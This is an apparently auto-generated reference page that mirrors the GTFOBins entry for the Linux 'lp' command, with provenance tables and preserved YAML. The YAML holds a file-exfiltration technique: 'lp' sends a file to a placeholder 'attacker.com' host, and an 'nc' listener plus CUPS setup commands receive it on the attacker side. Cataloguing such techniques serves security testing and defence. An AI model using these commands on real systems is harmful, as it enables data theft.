---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# lp

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `lp` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lp` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [lp](../../tools/linux/lp.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | lp |
| name | lp |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/lp/ |

## Preserved Source Material

```yaml
_body: ''
_name: lp
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lp
functions:
  upload:
  - code: lp /path/to/input-file -h attacker.com
    comment: 'This requires `cups` to be installed. Run the following on the attacker box beforehand:


      1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer;

      2. `lpadmin -d printer` to set the new printer as default;

      3. `cupsctl --remote-any` to enable printing from the Internet.'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver:
      code: nc -l -p 9100 >/path/to/output-file
      comment: A TCP server can be used on the attacker box to receive the data.
```
